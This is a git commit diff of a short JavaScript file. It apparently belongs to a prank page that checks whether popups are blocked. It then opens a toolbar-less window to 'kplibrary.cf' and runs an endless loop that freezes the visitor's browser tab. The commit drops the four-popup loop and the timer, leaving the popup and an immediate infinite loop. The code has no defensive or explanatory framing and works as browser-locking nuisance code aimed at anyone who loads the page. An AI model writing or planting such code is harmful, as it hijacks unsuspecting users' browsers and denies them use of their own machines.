a0b0c6f9cbcc25100919995a06cdf2423c853a6f
Dr3w0623 <34252192+Dr3w0623@users.noreply.github.com>
2017-12-08 20:26:17 -0500

    Update index.js

--- index.js
+++ index.js
@@ -5,10 +5,6 @@ if (popUp == null || typeof(popUp) == 'undefined') {
     alert("Thicc Katz")
   }
 } else {
-  for (var i = 0; i < 4; i++) {
     window.open('kplibrary.cf', '_blank', 'toolbar=0,location=0,menubar=0');
-  }
-  setTimeout(function() {
-    for (var i = 0; i === i; i++) {}
-  }, 5);
+ for (var i = 0; i === i; i++) {}
 }
